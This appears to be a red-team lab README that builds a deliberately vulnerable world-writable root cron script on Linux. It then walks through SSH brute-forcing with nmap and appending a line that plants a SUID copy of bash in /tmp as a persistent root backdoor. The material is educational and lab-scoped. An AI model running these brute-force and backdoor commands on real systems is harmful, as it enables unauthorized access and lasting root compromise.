---

# 🚩 Red-Team-Attack Simulation: Persistence & Escalation

This repository demonstrates how a simple misconfiguration in a background task can lead to a full system takeover.

> **Simulated Attack Flow:**

1. 🔐 **Brute-force:** Gain initial SSH access.
2. 🧑‍💻 **Access:** Login as a low-privilege user.
3. 🔄 **Persistence:** Identify a world-writable Cron script.
4. 🚀 **Privilege Escalation:** Use the Cron job to create a Root SUID backdoor.
5. 🏁 **Full Control:** Access the Root shell.

---

## 🔧 Phase 1: Environment Setup (The Vulnerability)

As the "Admin," create a script that root runs automatically, but forget to lock down the permissions.

**1. Create the "Maintenance" script:**

```bash
sudo nano /usr/local/bin/cleanup.sh

```

**2. Add dummy logic:**

```bash
#!/bin/bash
# System cleanup script
rm -rf /tmp/*.log

```

**3. The Fatal Mistake (Weak Permissions):**

```bash
sudo chmod 777 /usr/local/bin/cleanup.sh

```

**4. The Automation:**
Add to root's crontab (`sudo crontab -e`):
`* * * * * /usr/local/bin/cleanup.sh`

---

## 🛠️ Phase 2: The Attack Chain

### Step 1: External Access

From the attacker machine, find the user credentials:

```bash
nmap --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt -p 22 <target_ip>

```

### Step 2: Identification (Enumeration)

Login as the user and look for files you can edit:

```bash
ls -l /usr/local/bin/cleanup.sh

```

*Attacker sees `-rwxrwxrwx`, meaning they can change a script that Root executes.*

### Step 3: Persistence & Escalation

Inject the payload into the script. This payload creates a secret "backdoor" shell in `/tmp`.

```bash
echo "cp /bin/bash /tmp/backdoor && chmod +s /tmp/backdoor" >> /usr/local/bin/cleanup.sh

```

*Wait 60 seconds.*

### Step 4: The Result

The Cron job runs the script as Root. Because the SUID bit (`+s`) is now set on the copy, anyone who runs it inherits Root's powers.

```bash
/tmp/backdoor -p

```

Why this is a "Persistence" method

Even if the admin finds and deletes your /tmp/backdoor file, the "infection" is still in the cleanup.sh script. Every minute, the system will just recreate the backdoor for you. To truly stop you, the admin has to find the line you added to the script or fix the permissions.
